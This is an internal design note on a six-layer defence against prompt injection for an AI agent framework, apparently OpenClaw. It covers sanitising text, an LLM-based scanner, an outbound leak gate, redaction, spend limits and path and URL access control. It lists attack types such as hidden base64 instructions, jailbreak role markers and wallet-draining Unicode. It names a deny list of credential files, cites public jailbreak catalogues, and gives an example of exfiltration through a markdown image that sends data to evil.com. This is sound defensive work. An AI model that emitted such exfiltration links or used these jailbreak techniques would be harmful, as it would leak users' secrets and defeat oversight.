# Prompt Injection Defense — 6-Layer System for OpenClaw
Source: @MatthewBerman (Matthew Berman) | 2026-03-07
Status: PR submitted to OpenClaw core
Original: https://x.com/MatthewBerman/status/2030423565355676100

## Architecture (cheapest-first order)
```
Untrusted input
  → Layer 1: Text sanitization (pattern matching, Unicode cleanup) — FREE, instant
  → Layer 2: Frontier scanner (LLM risk scoring) — costs money, catches semantics
  → Layer 3: Outbound content gate (catches leaks going out) — FREE, instant
  → Layer 4: Redaction pipeline (PII, secrets, notifications) — FREE, instant
  → Layer 5: Runtime governance (spend caps, volume limits, loop detection)
  → Layer 6: Access control (file paths, URL safety)
```

## Layer 1: Deterministic Sanitizer (11 steps)
1. Strip invisible Unicode characters (zero-width, soft hyphens, etc.)
2. Strip wallet-draining Unicode (chars that tokenize to 3-10+ tokens each)
3. Normalize ~40 lookalike character pairs (Cyrillic а → Latin a)
4. Token budget enforcement (estimate actual token cost, truncate to budget)
5. Strip garbled text from excessive combining marks
6. Decode and normalize encoded characters (URL encoding, etc.)
7. Strip hidden instructions in base64/hex blocks
8. Statistical anomaly detection (flag high-entropy content)
9. Pattern match role markers and jailbreak commands
10. Strip code blocks
11. Hard character limit fallback

Return detection stats alongside cleaned text so quarantine layer can block.

## Layer 2: Frontier Scanner
- Dedicated LLM (separate from main agent), classification only
- Returns JSON: verdict (allow/review/block), risk score 0-100, attack categories, reasoning, evidence
- Review at score 35, block at score 70 (configurable)
- Override model verdict if score contradicts stated verdict
- Fail behavior: CLOSED for email/webhooks (high risk), OPEN for chat (low risk)
- Use STRONGEST model available here — weaker models fall for the attacks they're scanning for

## Layer 3: Outbound Content Gate
Scan everything before it leaves the system:
- API keys and auth tokens (pattern matching for Google, OpenAI, xAI, Slack, GitHub, Telegram)
- Internal file paths and network addresses
- Prompt injection artifacts that survived into output
- Data exfiltration: embedded image URLs (![img](https://evil.com/steal?data=X))
- Financial data (configurable allowlist for legitimate amounts)

## Layer 4: Redaction Pipeline
Before any outbound message to Discord/Telegram/Slack:
- Secret redaction: API keys, tokens (8 common formats → placeholder)
- PII redaction: personal emails (gmail/yahoo filtered, work domains pass), phone numbers, dollar amounts
- Chain into single pipeline that runs on ALL notifications

## Layer 5: Runtime Governor ⚠️ PRIORITY — WE NEED THIS
Wraps every LLM call system-wide. 4 mechanisms:
1. **Spend limit**: sliding window tracks estimated $ spend. Warn at $5/5min, HARD CAP at $15/5min (rejects all calls until cooldown)
2. **Volume limit**: 200 calls/10min globally, per-caller overrides (email extractor: 40, frontier scanner: 50)
3. **Lifetime counter**: per-process LLM call counter, default cap 300. Kills runaway loops no matter the cause.
4. **Duplicate detection**: hash recent prompts, return cached response instead of new call. Handles restarts, retries, scheduling overlaps.

All in-memory, JSON config with global defaults + per-caller overrides.

## Layer 6: Access Control
- Path guards: deny list of sensitive filenames (.env, credentials.json, SSH keys), sensitive extensions, allowed directories only, follow symlinks to prevent escapes
- URL safety: http/https only, resolve hostnames and check against private/reserved ranges, catch DNS rebinding

## Key Design Principles
1. **Cheapest first** — L1 (free) catches most attacks before L2 (costs money)
2. **Independence** — each layer must work even if others fail
3. **Single entry point** — chain L1+L2 behind one gate function
4. **Fail closed for high-risk sources** (email, webhooks), fail open for chat
5. **Governor catches bugs, not just attacks** — runaway retry storms = Tuesday

## Attack References (used to harden L1)
- github.com/elder-plinius/L1B3RT4S — jailbreak catalog
- github.com/elder-plinius/P4RS3LT0NGV3 — 79+ encoding/steganography techniques
- TOKEN80M8/TOKENADE — wallet-draining payloads

## Build Prompt (give to Stanley to build our version)
[Full prompt at end of original tweet — gives Stanley complete implementation spec for all 6 layers with tests]

## Our Implementation Status
- L1: AgentGuard covers basics. Missing: invisible char stripping, lookalike normalization, wallet-drain Unicode
- L2: OpenClaw EXTERNAL_UNTRUSTED_CONTENT tags + AgentGuard. Missing: dedicated LLM classifier
- L3: ❌ NOT IMPLEMENTED — we have no outbound gate
- L4: ❌ NOT IMPLEMENTED — no redaction pipeline before Discord posts
- L5: ❌ NOT IMPLEMENTED — **CRITICAL GAP** — we've had runaway cost spikes before
- L6: OpenClaw handles file paths. Missing: URL private-range checking

## Priority Implementation Order
1. **L5 Governor** — Stanley build (spend cap + volume limit + lifetime counter + dedup cache)
2. **L4 Redaction** — Stanley build (scan Dwight/Pam reports before Discord post)
3. **L3 Outbound gate** — Stanley build
4. **L1 Upgrade** — Extend AgentGuard with invisible char + lookalike normalization
